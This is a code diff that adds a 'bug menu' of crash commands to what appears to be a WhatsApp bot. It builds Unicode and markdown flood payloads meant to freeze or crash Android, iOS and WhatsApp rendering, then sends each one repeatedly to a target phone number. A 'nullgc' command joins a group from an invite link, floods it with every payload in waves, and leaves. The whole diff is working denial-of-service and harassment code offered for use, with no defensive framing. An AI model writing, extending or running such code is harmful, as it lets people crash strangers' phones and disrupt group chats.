@@ -1364,6 +1364,135 @@ async function handleCommand(ctx) {
     return true;
   }
 
+
+  // ════════════════════════════════════════════════════════════════
+  // 💀 BUG MENU — CRASH COMMANDS
+  // ════════════════════════════════════════════════════════════════
+
+  // ── Crash payload builders ────────────────────────────────────
+  // Android crash: overwhelms the Bidi text-direction algorithm
+  // in Android WebView with a flood of RTL/LTR control characters
+  // mixed with invisible zero-width chars — freezes renderer
+  function _crashAndroid() {
+    const z = '\u200B'.repeat(1500); // zero-width space
+    const r = '\u202E';             // RTL override (forces right-to-left)
+    const a = '\u0600'.repeat(300); // Arabic number sign (triggers Bidi)
+    const f = '\u200F'.repeat(800); // RTL mark
+    const l = '\u200E'.repeat(800); // LTR mark
+    return z + r + a + f + l + z + r + a + z;
+  }
+
+  // iOS crash: specific Malayalam/Tamil Unicode sequences that
+  // crash Apple CoreText rendering engine (iOS/macOS WhatsApp)
+  function _crashIos() {
+    const seq = '\u0D20\u0D3E\u0D4D\u200D\u0D35\u0D4D\u200D\u0D2F\u0D4D';
+    return seq.repeat(60) + '\u200B'.repeat(500) + '\uFEFF'.repeat(200) + seq.repeat(30);
+  }
+
+  // UI kill: massive invisible payload + emoji flood forces
+  // the WhatsApp message bubble to overflow memory allocation
+  function _killUi() {
+    const inv = '\u200B\u200C\u200D\uFEFF'.repeat(600);
+    const em  = '\uD83D\uDD34'.repeat(80); // 🔴 x80
+    return em + inv + '\u202E' + em + inv;
+  }
+
+  // Freeze: deeply nested WhatsApp markdown formatting causes
+  // the renderer to perform exponential work on a single message
+  function _freezeUi() {
+    const heavy = '*_~' + '\u200B'.repeat(4000) + '~_*';
+    return heavy + '\u202E' + heavy + '\u200B'.repeat(2000);
+  }
+
+  case 'bug-andro': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply('❌ Usage: .bug-andro 242065121108');
+    const bugTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
+    await reply('⚡ Sending Android crash payload...');
+    const payload = _crashAndroid();
+    for (let i = 0; i < 6; i++) {
+      try { await sock.sendMessage(bugTarget, { text: payload }); } catch (_) {}
+      await new Promise(r => setTimeout(r, 250));
+    }
+    await reply(`💀 *Android Bug sent!*\n📲 Target: +${bugTarget.split('@')[0]}`);
+    return true;
+  }
+
+  case 'kill-ui': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply('❌ Usage: .kill-ui 242065121108');
+    const killTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
+    await reply('⚡ Sending UI kill payload...');
+    const payload = _killUi();
+    for (let i = 0; i < 8; i++) {
+      try { await sock.sendMessage(killTarget, { text: payload }); } catch (_) {}
+      await new Promise(r => setTimeout(r, 150));
+    }
+    await reply(`💀 *Kill-UI sent!*\n📲 Target: +${killTarget.split('@')[0]}`);
+    return true;
+  }
+
+  case 'freezer-ui': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply('❌ Usage: .freezer-ui 242065121108');
+    const freezeTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
+    await reply('⚡ Sending freeze payload...');
+    const payload = _freezeUi();
+    for (let i = 0; i < 5; i++) {
+      try { await sock.sendMessage(freezeTarget, { text: payload }); } catch (_) {}
+      await new Promise(r => setTimeout(r, 300));
+    }
+    await reply(`💀 *Freezer-UI sent!*\n📲 Target: +${freezeTarget.split('@')[0]}`);
+    return true;
+  }
+
+  case 'dentsu-aple': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply('❌ Usage: .dentsu-aple 242065121108');
+    const appleTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
+    await reply('⚡ Sending iOS crash payload...');
+    const payload = _crashIos();
+    for (let i = 0; i < 5; i++) {
+      try { await sock.sendMessage(appleTarget, { text: payload }); } catch (_) {}
+      await new Promise(r => setTimeout(r, 200));
+    }
+    await reply(`💀 *Apple Bug sent!*\n📲 Target: +${appleTarget.split('@')[0]}`);
+    return true;
+  }
+
+  case 'nullgc': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply('❌ Usage: .nullgc https://chat.whatsapp.com/XXXXX');
+    const gcCode = text.includes('chat.whatsapp.com/')
+      ? text.split('chat.whatsapp.com/')[1]?.split(/[?\/ ]/)[0]
+      : text.trim();
+    if (!gcCode || gcCode.length < 10) return reply('❌ Invalid WhatsApp group link.');
+    let gcId = null;
+    try {
+      await reply('⏳ Joining group...');
+      gcId = await sock.groupAcceptInvite(gcCode);
+      await new Promise(r => setTimeout(r, 1500));
+      await reply(`✅ Joined! Nuking group...`);
+
+      // Send all 4 crash payloads in 3 waves
+      const payloads = [_crashAndroid(), _killUi(), _freezeUi(), _crashIos()];
+      for (let wave = 0; wave < 3; wave++) {
+        for (const p of payloads) {
+          try { await sock.sendMessage(gcId, { text: p }); } catch (_) {}
+          await new Promise(r => setTimeout(r, 200));
+        }
+        await new Promise(r => setTimeout(r, 400));
+      }
+      await new Promise(r => setTimeout(r, 1000));
+      try { await sock.groupLeave(gcId); } catch (_) {}
+      await reply('💀 *Group nuked and left!*');
+    } catch (e) {
+      if (gcId) try { await sock.groupLeave(gcId); } catch (_) {}
+      await reply(`❌ nullgc failed: ${e.message}`);
+    }
+    return true;
+  }
+
   default:
     return false;
   }
